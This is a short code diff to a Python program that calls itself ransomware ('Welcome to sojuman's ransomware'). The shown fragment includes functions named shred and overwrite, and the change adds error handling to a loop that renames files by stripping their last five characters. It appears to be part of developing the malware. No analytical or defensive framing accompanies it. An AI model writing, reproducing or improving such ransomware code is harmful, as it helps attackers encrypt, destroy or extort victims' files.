@@ -78,8 +78,11 @@ def shred(filelist):
 
 def overwrite(filelist):
     for filename in filelist:
-        os.rename(filename, filename[:-5])
-
+        try:
+            os.rename(filename, filename[:-5])
+    
+        except OSError:
+            pass
 def main():
     print ("="*50)
     print ("="*10, "Welcome to sojuman's ransomware","="*10)
